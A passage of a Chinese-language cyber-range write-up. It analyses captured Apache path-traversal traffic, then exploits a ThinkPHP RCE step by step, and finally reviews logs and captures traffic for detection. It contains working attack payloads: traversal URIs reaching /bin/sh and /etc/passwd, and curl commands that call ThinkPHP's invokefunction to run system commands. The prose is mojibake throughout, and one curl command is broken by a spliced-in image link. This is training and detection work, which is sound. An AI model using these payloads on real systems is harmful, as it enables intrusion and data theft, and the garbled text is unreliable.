- **å»ºç«‹æ—¶é—´**: ä»…ç”¨æ—¶40å¾®ç§’ï¼Œè¿æ¥å»ºç«‹éå¸¸å¿«é€Ÿ
- **ç½‘ç»œå»¶è¿Ÿ**: æä½å»¶è¿Ÿï¼Œè¯´æ˜æ˜¯æœ¬åœ°Dockerç½‘ç»œ

2.2 RCEæ”»å‡»è½½è·

```
æ•°æ®åŒ…4 (0.000105s): HTTP POSTè¯·æ±‚
- æ–¹æ³•: POST
- è·¯å¾„: /cgi-bin/..%2e/..%2e/..%2e/..%2e/bin/sh
- é•¿åº¦: 290å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨ `..%2e`æ··åˆç¼–ç ç»•è¿‡è·¯å¾„æ£€æŸ¥
- **ç›®æ ‡è·¯å¾„**: é€šè¿‡CGIè·¯å¾„éå†åˆ° `/bin/sh`
- **HTTPæ–¹æ³•**: POST - ç”¨äºå‘é€å‘½ä»¤æ‰§è¡Œpayload
- **è½½è·å¤§å°**: 290å­—èŠ‚ï¼ŒåŒ…å«å®Œæ•´çš„CGIå‘½ä»¤æ‰§è¡Œæ•°æ®

2.3 æœåŠ¡å™¨å“åº”

```
æ•°æ®åŒ…5 (0.000125s): TCP ACK - æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°è¯·æ±‚
æ•°æ®åŒ…6 (0.040140s): HTTP 200 OKå“åº”
- çŠ¶æ€ç : 200 OK
- å†…å®¹ç±»å‹: text/plain
- å“åº”é•¿åº¦: 254å­—èŠ‚
- å¤„ç†æ—¶é—´: 40æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç è¡¨æ˜RCEæ”»å‡»æˆåŠŸæ‰§è¡Œ
- **å“åº”å†…å®¹**: text/plainæ ¼å¼ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ
- **å¤„ç†å»¶è¿Ÿ**: 40æ¯«ç§’çš„å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æœåŠ¡å™¨æ‰§è¡Œäº†shellå‘½ä»¤
- **æ•°æ®å¤§å°**: 254å­—èŠ‚å“åº”ï¼Œå¯èƒ½åŒ…å« `id`å‘½ä»¤çš„è¾“å‡ºç»“æœ

2.4 è¿æ¥å…³é—­

```
æ•°æ®åŒ…7-10: TCPè¿æ¥å…³é—­
- æ•°æ®åŒ…8: æ”»å‡»æœºå‘èµ·FIN+ACK
- æ•°æ®åŒ…9: æœåŠ¡å™¨å“åº”FIN+ACK  
- æ•°æ®åŒ…10: æ”»å‡»æœºç¡®è®¤ACK
```

3. ç¬¬äºŒæ¬¡æ”»å‡»è¿æ¥åˆ†æ (æ•°æ®åŒ…11-20)

3.1 æ–°è¿æ¥å»ºç«‹

```
æ•°æ®åŒ…11-13 (4.212s): ç¬¬äºŒæ¬¡TCPä¸‰æ¬¡æ¡æ‰‹
- æ—¶é—´é—´éš”: 4.2ç§’åå‘èµ·æ–°è¿æ¥
- æ–°ç«¯å£: 40254 â†’ 80
- å»ºç«‹æ—¶é—´: 18å¾®ç§’
```

3.2 è·¯å¾„éå†æ”»å‡»

```
æ•°æ®åŒ…14 (4.212111s): HTTP GETè¯·æ±‚
- æ–¹æ³•: GET  
- è·¯å¾„: /icons/..%2e%2e/..%2e%2e/..%2e%2e/..%2e%2e/etc/passwd
- é•¿åº¦: 191å­—èŠ‚
- åè®®: HTTP
```

**æ”»å‡»ç‰¹å¾åˆ†æ**:

- **æ”»å‡»ç±»å‹**: è·¯å¾„éå†æ–‡ä»¶è¯»å–
- **ç›®æ ‡æ–‡ä»¶**: `/etc/passwd`ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
- **æ”»å‡»è·¯å¾„**: é€šè¿‡ `/icons/`è·¯å¾„è¿›è¡Œéå†
- **ç¼–ç æ–¹å¼**: `..%2e%2e`åŒé‡ç¼–ç ç»•è¿‡æ£€æŸ¥
- **HTTPæ–¹æ³•**: GET - ç”¨äºæ–‡ä»¶è¯»å–

3.3 æ–‡ä»¶è¯»å–æˆåŠŸ

```
æ•°æ®åŒ…16 (4.212740s): HTTP 200 OKå“åº”
- çŠ¶æ€ç : 200 OK
- å“åº”é•¿åº¦: 1192å­—èŠ‚
- å¤„ç†æ—¶é—´: 0.6æ¯«ç§’
```

**å“åº”åˆ†æ**:

- **æ”»å‡»æˆåŠŸ**: HTTP 200çŠ¶æ€ç ç¡®è®¤æ–‡ä»¶è¯»å–æˆåŠŸ
- **æ–‡ä»¶å¤§å°**: 1192å­—èŠ‚ï¼Œä¸ `/etc/passwd`æ–‡ä»¶å¤§å°ä¸€è‡´
- **å¿«é€Ÿå“åº”**: 0.6æ¯«ç§’å¤„ç†æ—¶é—´ï¼Œè¯´æ˜æ˜¯ç›´æ¥æ–‡ä»¶è¯»å–
- **æ•°æ®æ³„éœ²**: æˆåŠŸè·å–äº†ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯

4. æ”»å‡»æ¨¡å¼æ€»ç»“

4.1 æ”»å‡»æ—¶åºåˆ†æ

```
æ—¶é—´è½´:
0.000s - 0.041s: RCEæ”»å‡» (è¿æ¥1)
4.212s - 4.216s: æ–‡ä»¶è¯»å–æ”»å‡» (è¿æ¥2)
```

**æ”»å‡»ç­–ç•¥**:

- **åˆ†é˜¶æ®µæ”»å‡»**: å…ˆæ‰§è¡Œå‘½ä»¤è·å–æƒé™ï¼Œå†è¯»å–æ•æ„Ÿæ–‡ä»¶
- **è¿æ¥å¤ç”¨**: ä½¿ç”¨ä¸åŒTCPè¿æ¥é¿å…æ£€æµ‹
- **æ—¶é—´é—´éš”**: 4ç§’é—´éš”ï¼Œå¯èƒ½æ˜¯æ‰‹åŠ¨æ“ä½œæˆ–è„šæœ¬å»¶è¿Ÿ

4.2 æŠ€æœ¯ç‰¹å¾è¯†åˆ«

```
ç¼–ç æŠ€æœ¯å¯¹æ¯”:
- RCEæ”»å‡»: ..%2e (æ··åˆç¼–ç )
- æ–‡ä»¶è¯»å–: ..%2e%2e (åŒé‡ç¼–ç )
```

**ç»•è¿‡æŠ€æœ¯**:

- **è·¯å¾„å¤šæ ·åŒ–**: CGIè·¯å¾„å’Œiconsè·¯å¾„åˆ†åˆ«åˆ©ç”¨
- **ç¼–ç å˜åŒ–**: ä¸åŒçš„URLç¼–ç æ–¹å¼
- **æ–¹æ³•åˆ‡æ¢**: POSTæ‰§è¡Œå‘½ä»¤ï¼ŒGETè¯»å–æ–‡ä»¶

5. å®‰å…¨æ£€æµ‹è¦ç‚¹

5.1 æµé‡ç‰¹å¾æ£€æµ‹

```bash
# æ£€æµ‹è·¯å¾„éå†ç‰¹å¾
- URLåŒ…å«: %2e%2e, ..%2e, ../../../../
- è·¯å¾„æ¨¡å¼: /cgi-bin/.., /icons/..
- ç›®æ ‡æ–‡ä»¶: /etc/passwd, /bin/sh
```

5.2 å¼‚å¸¸è¡Œä¸ºè¯†åˆ«

```bash
# å¼‚å¸¸å“åº”æ¨¡å¼
- CGIè·¯å¾„è¿”å›200çŠ¶æ€ç 
- å¤§é‡å­—èŠ‚çš„æ–‡ä»¶è¯»å–å“åº”
- çŸ­æ—¶é—´å†…å¤šæ¬¡è·¯å¾„éå†å°è¯•
```

5.3 ç½‘ç»œç›‘æ§è§„åˆ™

```bash
# Wiresharkè¿‡æ»¤è§„åˆ™
http.request.uri contains "%2e%2e" or 
http.request.uri contains "cgi-bin" and http.request.uri contains ".." or
http.request.uri contains "icons" and http.request.uri contains ".."
```

6. æ”»å‡»æˆåŠŸæŒ‡æ ‡

**ç¡®è®¤æ”»å‡»æˆåŠŸçš„å…³é”®è¯æ®**:

1. âœ… **RCEæˆåŠŸ**: POSTè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ254å­—èŠ‚å“åº”
2. âœ… **æ–‡ä»¶è¯»å–æˆåŠŸ**: GETè¯·æ±‚è¿”å›200çŠ¶æ€ç ï¼Œ1192å­—èŠ‚å“åº”
3. âœ… **æƒé™è·å–**: èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å’Œè¯»å–æ•æ„Ÿæ–‡ä»¶
4. âœ… **ç»•è¿‡é˜²æŠ¤**: æˆåŠŸç»•è¿‡Apacheçš„è·¯å¾„æ£€æŸ¥æœºåˆ¶


## å†…ç½‘ç¬¬ä¸‰å±‚é¶æ ‡åˆ©ç”¨æ£€æµ‹

### `vulfocus/thinkphp-cve_2018_1002015:latest` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/thinkphp-cve_2018_1002015:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚
æ ¹æ®ç”¨æˆ·æä¾›çš„æˆªå›¾ï¼Œé¶æœºæˆåŠŸå¯åŠ¨ï¼ŒVulfocus åˆ†é…çš„è®¿é—®åœ°å€ä¸º `10.37.133.3:39365`ã€‚

![1748019861063](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019861063.png)

#### 2. ä¿¡æ¯æ”¶é›†

é€šè¿‡æµè§ˆå™¨è®¿é—®é¶æœº `http://10.37.133.3:39365`ã€‚
![1748019898037](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019898037.png)

é¡µé¢æ˜¾ç¤º: "Welcome BMH shooting range"ã€‚è¿™ä¸ªä¿¡æ¯æ¯”è¾ƒé€šç”¨ï¼Œæ²¡æœ‰ç›´æ¥æš´éœ² ThinkPHP ç‰ˆæœ¬å·ã€‚
`CVE-2018-1002015` è¿™ä¸ª CVE ID å¹¶éå¹¿ä¸ºäººçŸ¥çš„ ThinkPHP æ ‡å‡† CVE ç¼–å·ã€‚ä½† `vulfocus/thinkphp-cve_2018_1002015` è¿™ä¸ªé•œåƒåç§°æš—ç¤ºå®ƒä¸ 2018 å¹´å·¦å³çš„ ThinkPHP æ¼æ´ç›¸å…³ã€‚è¿™é€šå¸¸æŒ‡å‘ ThinkPHP 5.x ç³»åˆ—çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ï¼Œä¾‹å¦‚è‘—åçš„ CVE-2018-20062ã€‚æˆ‘ä»¬å°†åŸºäºè¿™ç±»æ¼æ´è¿›è¡Œå°è¯•ã€‚

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

æ­¤æ¼æ´æºäº ThinkPHP æ¡†æ¶å¯¹æ§åˆ¶å™¨åç§°çš„è§£æå­˜åœ¨ç¼ºé™·ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„ URL æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é‡è¦æç¤ºï¼š** åœ¨ä½¿ç”¨ `curl` æ‰§è¡Œä»¥ä¸‹ Payload æ—¶ï¼Œå¦‚æœ URL ä¸­åŒ…å«æ–¹æ‹¬å· `[` å’Œ `]` (ä¾‹å¦‚ `vars[0]` æˆ– `vars[1][]`)ï¼Œç›´æ¥ä½¿ç”¨å¯èƒ½ä¼šå¯¼è‡´ `curl: (3) bad range in URL` é”™è¯¯ã€‚è¿™æ˜¯å› ä¸ºæ–¹æ‹¬å·åœ¨ URL ä¸­æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œç™¾åˆ†å·ç¼–ç ã€‚`[` åº”ç¼–ç ä¸º `%5B`ï¼Œ`]` åº”ç¼–ç ä¸º `%5D`ã€‚å»ºè®®å°†æ•´ä¸ª URL ç”¨å•å¼•å· `'` åŒ…è£¹ï¼Œä»¥é¿å… shell å¯¹ç‰¹æ®Šå­—ç¬¦ (å¦‚ `&`, `\`) çš„é¢å¤–è½¬ä¹‰ã€‚

* **Payload 1: æ‰§è¡Œ `phpinfo()` (éªŒè¯æ¼æ´å­˜åœ¨æ€§)**
  æ„é€ å¦‚ä¸‹ URL (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç )ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
  ä½¿ç”¨ `curl` æˆ–æµè§ˆå™¨è®¿é—®ï¼š

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1'
  ```

  ![1748020421170](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748020421170.png)
  å¦‚å›¾,å“åº”ä¸­åŒ…å« PHP çš„é…ç½®ä¿¡æ¯ï¼ˆ`phpinfo()` çš„è¾“å‡ºï¼‰ï¼Œåˆ™è¡¨æ˜æ¼æ´å­˜åœ¨ä¸”å¯åˆ©ç”¨ã€‚
* **Payload 2: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (ä¾‹å¦‚ `id`)**
  æ„é€  URL ä»¥æ‰§è¡Œ `id` å‘½ä»¤ (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç )ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id`
  ä½¿ç”¨ `curl` æ‰§è¡Œï¼š

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id'
  ```

  å¦‚å›¾,å“åº”ä¸­åŒ…å«ç±»ä¼¼ `uid=0(root) gid=0(root) groups=0(root)` çš„è¾“å‡ºï¼Œè¡¨ç¤ºå‘½ä»¤æˆåŠŸæ‰§è¡Œ
  ![1748020916102](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748020916102.png)
* **Payload 3: è·å– Flag**
  å‡è®¾ flag æ–‡ä»¶ä½äº `/flag.txt` æˆ– `/flag`ã€‚
  æ„é€  URL (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç ) å°è¯•è¯»å– `/flag.txt`ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt`
  æˆ–è€…å°è¯•è¯»å– `/flag`ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag`
  ä½¿ç”¨ `curl` è·å–ï¼š

  ```bash
  # å°è¯•è¯»å– /flag.txt
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt'
  # æˆ–è€…å°è¯•è¯»å– /flag
  curl 'http://10.37.133.3:![1748067441252](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748067441252.png)39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag'
  ```

  ![1748021243075](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021243075.png)

  å°è¯• cat /flag.txt å’Œ cat /flag éƒ½æ²¡æœ‰è¿”å›ä»»ä½•è¾“å‡ºï¼Œè¿™æ„å‘³ç€ flag æ–‡ä»¶å¯èƒ½ä¸åœ¨è¿™äº›é¢„æœŸçš„è·¯å¾„ä¸‹ï¼Œæˆ–è€…æ–‡ä»¶åä¸åŒï¼Œæˆ–è€…æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„ç”¨æˆ·ï¼ˆé€šè¿‡ id å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼Œé€šå¸¸æ˜¯ www-data æˆ–ç±»ä¼¼æƒé™è¾ƒä½çš„ç”¨æˆ·ï¼‰æ²¡æœ‰æƒé™è¯»å–è¿™äº›æ–‡ä»¶ã€‚

1. å°è¯•åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶å’Œç›®å½•ï¼š

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20-la%20/'
```

![1748021233259](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021233259.png)

è¿™é‡Œç›´æ¥çœ‹å¹¶æ²¡æœ‰æ˜æ˜¾å«åš "flag" æˆ–ç±»ä¼¼çš„æ–‡ä»¶ã€‚app å’Œ var ç›®å½•æ˜¯å¸¸è§çš„Webåº”ç”¨ç›¸å…³ç›®å½•ï¼Œä½†æ ¹ç›®å½•ä¸‹æ²¡æœ‰ç›´æ¥çš„ flag æ–‡ä»¶

2. æœç´¢åä¸º "flag" (ä¸åŒºåˆ†å¤§å°å†™) çš„æ–‡ä»¶ï¼š
   æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ find å‘½ä»¤åœ¨æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢åŒ…å« "flag" å­—ç¬¦ä¸²çš„æ–‡ä»¶åã€‚è¿™å¯èƒ½ä¼šäº§ç”Ÿå¾ˆå¤šè¾“å‡ºï¼Œä½† flag å¯èƒ½å°±åœ¨å…¶ä¸­ã€‚
   find / -name '*flag*' (æœç´¢æ–‡ä»¶åä¸­åŒ…å« "flag" çš„æ–‡ä»¶ï¼Œä¸åŒºåˆ†å¤§å°å†™å¯ä»¥ä½¿ç”¨ -iname)
   è€ƒè™‘åˆ°è¾“å‡ºå¯èƒ½å¾ˆé•¿ï¼Œç›´æ¥åœ¨ curl ä¸­æ˜¾ç¤ºå¯èƒ½ä¸æ–¹ä¾¿ï¼Œä½†æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ã€‚
   éœ€è¦å¯¹ find å‘½ä»¤ä¸­çš„ / å’Œ * è¿›è¡Œ URL ç¼–ç ï¼š/ ç¼–ç ä¸º %2Fï¼Œ* ç¼–ç ä¸º %2Aã€‚

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=find%20%2F%20-name%20%27%2Aflag%2A%27'
```

![1748021332621](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021332621.png)

find å‘½ä»¤æˆåŠŸæ‰§è¡Œ,æ‰¾åˆ°äº†flag!

 `flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`

 ![1748023336097](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023336097.png)

#### 4. å¨èƒæ£€æµ‹

##### 4.1 æŸ¥çœ‹ Web æœåŠ¡å™¨è®¿é—®æ—¥å¿—:

  é¦–å…ˆç¡®å®š `thinkphp-cve_2018_1002015` å®¹å™¨çš„ ID æˆ–åç§°ï¼š

```bash
  docker ps
```

![1748021570040](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021570040.png)

  å¾—åˆ°å®¹å™¨ID ä¸º `c097683c73a4`ã€‚
  è¿›å…¥å®¹å™¨å†…éƒ¨ï¼š

```bash
  docker exec -it c097683c73a4 /bin/bash
```

![1748021853513](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021853513.png)
è¿™ä¸ªé”™è¯¯ OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/bash": stat /bin/bash: no such file or directory: unknown è¡¨æ˜åœ¨å®¹å™¨ c097683c73a4 å†…éƒ¨ï¼Œ/bin/bash è¿™ä¸ªè·¯å¾„æ˜¯æ— æ•ˆçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥å®¹å™¨ä¸­æ²¡æœ‰å®‰è£… bash shellï¼Œæˆ–è€…å®ƒä¸åœ¨ /bin/bash è¿™ä¸ªä½ç½®ã€‚

è¿™é€šå¸¸å‘ç”Ÿåœ¨ä¸€äº›æç®€çš„ Docker é•œåƒä¸­ï¼Œå®ƒä»¬ä¸ºäº†å‡å°ä½“ç§¯å¯èƒ½åªåŒ…å«äº†æœ€åŸºç¡€çš„ shellï¼Œå¦‚ /bin/sh (Bourne Shell)ï¼Œæˆ–è€…ç”šè‡³æ²¡æœ‰ä¸€ä¸ªæ ‡å‡†çš„äº¤äº’å¼ shellã€‚

è§£å†³æ–¹æ¡ˆï¼šå°è¯•ä½¿ç”¨ /bin/sh

```bash
  docker exec -it c097683c73a4 /bin/sh
```

![1748021885646](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021885646.png)
æˆåŠŸè¿›å…¥

    2.**å®šä½ ThinkPHP æ—¥å¿—ç›®å½•**:
        ThinkPHP çš„æ—¥å¿—é€šå¸¸ä½äº `/app/runtime/log/` (å¦‚æœåº”ç”¨éƒ¨ç½²åœ¨ `/app` ç›®å½•)ã€‚
        æ ¹æ®ä¹‹å‰çš„æ¢ç´¢ï¼Œæ—¥å¿—æŒ‰å¹´æœˆåˆ†å­ç›®å½•ï¼Œä¾‹å¦‚ `runtime/log/YYYYMM/DD.log`ã€‚

```bash
# åœ¨å®¹å™¨å†…æ‰§è¡Œ   
ls -la /app/runtime/log/
```

![1748022328861](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022328861.png)

åœ¨ `202505` ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°ä»¥æ—¥æœŸå‘½åçš„ `.log` æ–‡ä»¶: `24.log`

![1748022443415](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022443415.png)

    3.**æŸ¥çœ‹æ—¥å¿—å†…å®¹**:

```bash
# æ—¥å¿—æ–‡ä»¶ä¸º /app/runtime/log/202505/24.log   
cat /app/runtime/log/202505/24.log   
# æˆ–è€…ä½¿ç”¨ tail æŸ¥çœ‹æœ€æ–°çš„æ—¥å¿—   
tail -f /app/runtime/log/202505/24.log
```

![1748022479245](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022479245.png)

```bash
/app/runtime/log/202505 #         cat /app/runtime/log/202505/24.log
---------------------------------------------------------------
[ 2025-05-24T01:12:36+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:13:19+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type errorï¼š boolean
---------------------------------------------------------------
[ 2025-05-24T01:14:24+08:00 ] 10.37.133.3 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
[ error ] [0]variable type errorï¼š boolean
```

**æ—¥å¿—åˆ†æ**ï¼š

* **è¯·æ±‚è¯¦æƒ…**ï¼šæ—¥å¿—ä¸­æ¸…æ™°å¯è§å¤šä¸ªé’ˆå¯¹ `index.php` çš„ GET è¯·æ±‚ï¼Œå®ƒä»¬éƒ½åˆ©ç”¨äº† ThinkPHP RCE æ¼æ´çš„ç‰¹å¾ (`s=index/\think\app/invokefunction`, `function=call_user_func_array`, `vars[0]=phpinfo`) æ¥å°è¯•æ‰§è¡Œ `phpinfo()` å‡½æ•°ã€‚
* **é”™è¯¯ä¿¡æ¯**ï¼šæ¯ä¸ªæˆåŠŸçš„ `phpinfo()` è°ƒç”¨è¯·æ±‚åéƒ½è®°å½•äº† `[ error ] [0]variable type errorï¼š boolean`ã€‚è¿™è¡¨æ˜å°½ç®¡ `phpinfo()` æˆåŠŸæ‰§è¡Œï¼ˆå¦‚å®éªŒå‰é¢æ­¥éª¤æ‰€ç¤ºï¼Œè¾“å‡ºäº†PHPä¿¡æ¯ï¼‰ï¼Œä½† ThinkPHP çš„æ—¥å¿—ç³»ç»Ÿåœ¨å¤„ç† `phpinfo()` å‡½æ•°çš„è¿”å›å€¼ (é€šå¸¸æ˜¯ `true`) æ—¶é‡åˆ°äº†ç±»å‹ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå› æ­¤è®°å½•äº†æ­¤é”™è¯¯ã€‚è¿™ä¸ªé”™è¯¯å¹¶ä¸ä»£è¡¨æ¼æ´åˆ©ç”¨å¤±è´¥ï¼Œè€Œæ˜¯æ¡†æ¶å†…éƒ¨å¤„ç†æµç¨‹çš„ä¸€ä¸ªè¡¨ç°ã€‚
* **æ”»å‡»æº¯æº**ï¼šæ—¥å¿—è®°å½•äº†æ”»å‡»å‘ç”Ÿçš„æ—¶é—´ï¼ˆä¾‹å¦‚ `2025-05-24T01:12:36+08:00`ï¼‰å’Œè¯·æ±‚çš„æº IP åœ°å€ï¼ˆä¾‹å¦‚ `10.37.133.2`, `10.37.133.3`ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºè¿½è¸ªæ”»å‡»æ¥æºè‡³å…³é‡è¦ã€‚

å¦‚æœæ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼ˆå¦‚ `system` è°ƒç”¨ `id` æˆ– `cat`ï¼‰ï¼Œå…¶è¯·æ±‚ä¹Ÿä¼šè¢«ç±»ä¼¼åœ°è®°å½•ä¸‹æ¥ï¼Œä½†å…¶æ‰§è¡Œç»“æœï¼ˆå¦‚ `id` çš„è¾“å‡ºæˆ– flag å†…å®¹ï¼‰ä¸»è¦é€šè¿‡ HTTP å“åº”ç›´æ¥è¿”å›ç»™æ”»å‡»è€…ï¼Œä¸ä¸€å®šä¼šè¯¦ç»†è®°å½•åœ¨ ThinkPHP çš„åº”ç”¨å±‚æ—¥å¿—ä¸­ï¼Œé™¤éé…ç½®äº†ç‰¹å®šçš„æ—¥å¿—çº§åˆ«æˆ–å‘½ä»¤æ‰§è¡Œæœ¬èº«è§¦å‘äº† PHP é”™è¯¯ã€‚

##### 4.3 ç½‘ç»œæµé‡æ•è·:

ä¸é¶æ ‡ä¸€ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ (`docker0`) ä»¥åŠé¶æ ‡äºŒå®¹å™¨åœ¨è¯¥ç½‘ç»œä¸­çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ã€‚

1. **ç¡®å®šå®¹å™¨å†…éƒ¨ IP**:
   ä½¿ç”¨ `docker inspect c097683c73a4`æŸ¥çœ‹å®¹å™¨ç½‘ç»œè¯¦æƒ…ã€‚

   ```json
   // docker inspect c097683c73a4 è¾“å‡ºç‰‡æ®µ
   {
       "Id": "c097683c73a4f9c0e4ab736db3880a3d0da11c2e73a1e2af23d439ce10478271",
       // ... (å…¶ä»–å­—æ®µå·²çœç•¥)
       "Config": {
           // ...
           "ExposedPorts": {
               "80/tcp": {}
           },
           // ...
       },
       "NetworkSettings": {
           // ...
           "Ports": {
               "80/tcp": [
                   {
                       "HostIp": "0.0.0.0",
                       "HostPort": "39365"
                   },
                   {
                       "HostIp": "::",
                       "HostPort": "39365"
                   }
               ]
           },
           // ...
           "IPAddress": "172.17.0.2", // å®¹å™¨åœ¨é»˜è®¤ bridge ç½‘ç»œä¸Šçš„ IP
           // ...
           "Networks": {
               "bridge": {
                   // ...
                   "IPAddress": "172.17.0.2",
                   "Gateway": "172.17.0.1",
                   // ...
               }
           }
       }
   }
   ```

   æ ¹æ®è¾“å‡ºï¼Œå®¹å™¨ `c097683c73a4` åœ¨ `bridge` ç½‘ç»œï¼ˆé€šå¸¸å¯¹åº” `docker0` æ¥å£ï¼‰ä¸‹çš„ `IPAddress` ä¸º `172.17.0.2`ï¼Œå…¶å†…éƒ¨æœåŠ¡ç«¯å£ä¸º `80` (å¤–éƒ¨æ˜ å°„åˆ° `39365`)ã€‚
   ![1748022767146](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748022767146.png)

2.**æ‰§è¡Œ `tcpdump` å‘½ä»¤**:

```bash
# å®¹å™¨å†…éƒ¨ IP ä¸º 172.17.0.2ï¼Œå®¹å™¨å†…æœåŠ¡ç«¯å£ä¸º 80   
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w thinkphp_traffic.pcap
```

